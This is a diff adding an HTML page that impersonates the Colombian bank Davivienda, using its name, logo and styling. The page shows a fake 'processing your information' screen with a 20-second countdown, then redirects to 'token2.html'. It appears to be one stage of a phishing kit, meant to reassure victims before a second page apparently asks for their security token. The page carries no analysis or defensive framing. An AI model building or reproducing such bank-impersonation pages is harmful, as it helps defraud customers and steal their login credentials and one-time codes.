@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DAVIVIENDA</title>
+     
+    <link rel="stylesheet" href="daviviendacom.css">
+    <link rel="stylesheet" href="jquery-ui.css">
+    <link rel="stylesheet" href="responsiveNatural.css">
+    <link rel="stylesheet" type="text/css" href="/wps/contenthandler/dav/fs-type1/themes/DaviviendaHTML5/css/estilos-wps9.css">
+    
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-image: url("background-personas.jpg");
+            background-size: cover;
+            background-position: center;
+        }
+        .contenedor {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: auto;
+        }
+        .enunciado {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .gif-cargando {
+            width: 150px;
+            height: 100px;
+            display: block;
+            margin: 0 auto 10px;
+        }
+        .texto-cargando {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 600px) {
+            .enunciado {
+                font-size: 20px;
+            }
+            .gif-cargando {
+                width: 80px;
+                height: 80px;
+            }
+            .texto-cargando {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <script>
+        function startCountdown() {
+            var countdownElement = document.getElementById('contador');
+            var countdown = 20; // Tiempo en segundos
+
+            var interval = setInterval(function() {
+                countdown--;
+                var mensaje = `Estamos procesando tu información. Por favor espera ${countdown} segundos mientras procesamos tu información.`;
+                countdownElement.textContent = mensaje;
+                
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'token2.html'; // Redirigir a la página principal
+                }
+            }, 1000);
+        }
+
+        window.onload = function() {
+            startCountdown();
+            setTimeout(function() {
+                window.location.href = 'token2.html'; // Redirigir a la página principal después de 20 segundos
+            }, 20000); // Milisegundos equivalentes a 20 segundos
+        };
+    </script>
+</head>
+<body class="bodyPersonas">
+
+    <header>
+        <div class="cabecera" bis_skin_checked="1">
+            <div class="wrapLeft" style="padding-top: 0px;" bis_skin_checked="1">
+                <img src="logo-davivienda2.png" alt="LogoDavivienda">
+            </div>
+            <div class="wrapRight" bis_skin_checked="1">
+                <script language="JavaScript"><!--
+                    obtenerFechaFormato();
+                //--></script>
+                DAVIVIENDA CRÉDITOS Y PRESTAMOS<br>
+                Código único CUS: 712603292
+            </div>
+        </div>
+    </header>
+    
+    <div class="contenedor">
+        <img src="davi.webp" width="50px" alt="Cargando" class="gif-cargando">
+        <div class="texto-cargando">CARGANDO INFORMACIÓN</div>
+        <div class="spinner"></div>
+        <div id="contador" class="contador">Estamos procesando tu información. Por favor espera 20 segundos mientras procesamos tu información.</div>
+    </div>
+</body>
+</html>
